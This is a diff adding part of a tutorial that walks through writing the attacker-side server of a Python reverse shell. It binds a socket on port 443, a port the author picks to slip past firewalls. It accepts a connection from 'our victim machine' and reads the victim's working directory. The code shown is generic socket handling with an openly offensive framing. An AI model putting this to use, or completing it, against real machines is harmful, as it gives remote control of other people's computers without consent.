@@ -33,5 +33,30 @@ server_host= "0.0.0.0"
 server_port= 443
 data_size = 1024 * 128
 SEPARATOR = "<sep>"
+cyber = socket.socket()
 ```
- the code above is our main 
+As you can understanf from the variable names the server_host is the IP address of our server/attacker_machine we used the IP 0.0.0.0 in order to make the server reachable through all the IPv4 addresses of the server. For the server_port I used the port 443. We can use any port we want but the port 80 and 443 are widely used to bypass firewalls. data_size is the maximum ammoun of data that the client can send to the server and versversa.
+SPERATOR is the seperation between the data sent or received.
+
+then I created a socket and I called it cyber this is what we are going to use in the second part of our code.
+
+Let's bind the socket that we created to out server IP and port that we initiated in the first two commands.
+```
+cyber.bind((server_host,server_port))
+```
+One of the most important part in creating such server is that it should have the ability to listen and accept incoming requests that why we need this two lines:
+```
+cyber.listen(10)
+client_socket, client_ip = cyber.accept()
+```
+the listen function will allow us to listen to the incoming connections and the paramater 10 I used is the maximum length to which the queue of pending connections for sockfd may grow. That means if we receive 12 requests before we accept the connection then 2 of these requests will be droped.
+The second line means that we accepted the connection from the client (our victim machine) and we stored the victim_socket and the victim_adress in two different variabales.
+```
+print(f"{client_ip[0]}:{client_ip[1]} Connected!")
+```
+This output will have the following format IP:PORT connected!
+The first step we will do after having a connected client is to try and get the working directory on the victims devices this is why we will use the following code:
+```
+cmd = client_socket.recv(data_size).decode()
+print("[+] Current working directory:", cmd)
+```
